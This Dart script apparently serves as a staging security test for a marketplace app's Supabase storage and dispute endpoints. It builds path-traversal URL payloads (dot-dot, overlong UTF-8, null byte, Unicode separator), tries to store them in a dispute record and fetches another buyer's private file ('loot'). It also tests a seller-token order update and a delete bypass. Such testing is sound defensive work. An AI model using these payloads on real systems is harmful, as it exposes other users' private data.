/// Confirma HOLDs DQ — sem corrigir produto. Staging only.
import 'dart:convert';
import 'dart:io';
import '_rtdq.dart';

const pngBytes = <int>[
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D,
  0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
  0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00,
  0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0xD7, 0x63, 0xF8, 0xCF, 0xC0, 0x00,
  0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x05, 0xFE, 0xD4, 0xEF, 0x00, 0x00,
  0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82,
];

void main() async {
  final c = Rtdq.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();

  const oid = '13937338-60c2-4cfb-92c3-e1a9f8d4529a';
  const did = 'aa6e8cf9-38a0-4dae-aa64-e103186db049';
  const d2oid = '7aa93613-c723-47ee-97df-a342788befa0';
  const b2 = '8c3bf978-e7a4-4f47-90b2-d51676a3c48e';
  final b1 = c.buyerId!;

  Future<HttpHit> canon(String url) =>
      c.rpc('batata_storage_url_path_canonical', {'p_url': url}, service: true);
  Future<HttpHit> ok(String url) => c.rpc(
        'batata_dispute_proof_url_ok',
        {'p_url': url, 'p_buyer': b1, 'p_oid': oid},
        service: true,
      );

  final mine =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$oid/ok.png';
  const triple = '\u2afb';
  final a1b = '$mine%2e%2e%2f$b2/rtdq-secret.png';
  final a5 = '$mine${triple}order_disputes/$b2/00000000-0000-0000-0000-00000000dq02/rtdq-secret.png';
  final a5b = '$mine%25c0%25aforder_disputes/$b2/00000000-0000-0000-0000-00000000dq02/rtdq-secret.png';
  final a5c = '$mine%00order_disputes/$b2/00000000-0000-0000-0000-00000000dq02/rtdq-secret.png';

  final out = <String, Object?>{};

  for (final e in {
    'clean': mine,
    'a1b_dotdot': a1b,
    'a5_2afb': a5,
    'a5b_overlong': a5b,
    'a5c_pct00': a5c,
  }.entries) {
    final cn = await canon(e.value);
    final po = await ok(e.value);
    out[e.key] = {
      'input_len': e.value.length,
      'input_has_2afb': e.value.contains(triple),
      'input_has_252f': e.value.contains('%2e%2e'),
      'canon': cn.body,
      'proof_ok': po.body,
    };
  }

  final row = await c.disputeRow(did);
  out['d1_dispute_row'] = {
    'return_label_url': row?['return_label_url'],
    'proof_photos': row?['proof_photos'],
    'status': row?['status'],
  };

  // Persist attempt: PATCH proof_photos with hostile URLs (existing disputa)
  final pA1b = await c.patchDispute(did, {
    'proof_photos': [a1b],
  });
  final pA5 = await c.patchDispute(did, {
    'proof_photos': [a5],
  });
  final afterA5 = await c.disputeRow(did);
  out['persist_a1b'] = {
    'hit': pA1b.brief,
    'photos': (await c.disputeRow(did))?['proof_photos'],
  };
  out['persist_a5'] = {
    'hit': pA5.brief,
    'photos': afterA5?['proof_photos'],
    'label': afterA5?['return_label_url'],
  };

  // Loot GET B2 object as B1
  final loot = await c.storageGet(
    'order_disputes/$b2/00000000-0000-0000-0000-00000000dq02/rtdq-secret.png',
    jwt: c.buyerJwt,
  );
  out['loot_b2_as_b1'] = loot.brief;

  // D2 with seller JWT
  final d2before = await c.orderRow(d2oid);
  final d2p = await c.patchOrder(d2oid, {'status': 'enviado'}, jwt: c.sellerJwt);
  final d2after = await c.orderRow(d2oid);
  out['d2_seller_jwt'] = {
    'before': d2before?['status'],
    'hit': d2p.brief,
    'after': d2after?['status'],
    'shipped_at': d2after?['shipped_at'],
    'proof': d2after?['proof_url'],
  };

  // A4 delete with octet-stream (avoid JSON empty body)
  final a4path = 'order_disputes/$b1/$oid/revoke.png';
  final del = await c.storage(
    'DELETE',
    'object/fleaber_private/$a4path',
    jwt: c.buyerJwt,
    extra: {'Content-Type': 'application/octet-stream'},
  );
  final sign = await c.signObject(a4path, jwt: c.buyerJwt);
  HttpHit after = HttpHit(0, 'no_sign', null);
  if (sign != null) {
    after = await c.storageGetSigned(sign);
  }
  final getAuth = await c.storageGet(a4path, jwt: c.buyerJwt);
  out['a4_delete'] = {
    'del': del.brief,
    'sign': sign,
    'get_signed': after.brief,
    'get_auth': getAuth.brief,
  };

  // Re-sign own ok.png and PATCH label (happy D1b confirm)
  final signed = await c.signObject(
    'order_disputes/$b1/$oid/ok.png',
    jwt: c.buyerJwt,
  );
  if (signed != null) {
    final lab = await c.patchDispute(did, {'return_label_url': signed});
    final afterLab = await c.disputeRow(did);
    out['d1b_label_retry'] = {
      'hit': lab.brief,
      'stored': afterLab?['return_label_url'],
    };
  }

  await dumpJson('${outDir()}/confirm.json', out);
  stdout.writeln(const JsonEncoder.withIndent('  ').convert(out));
}
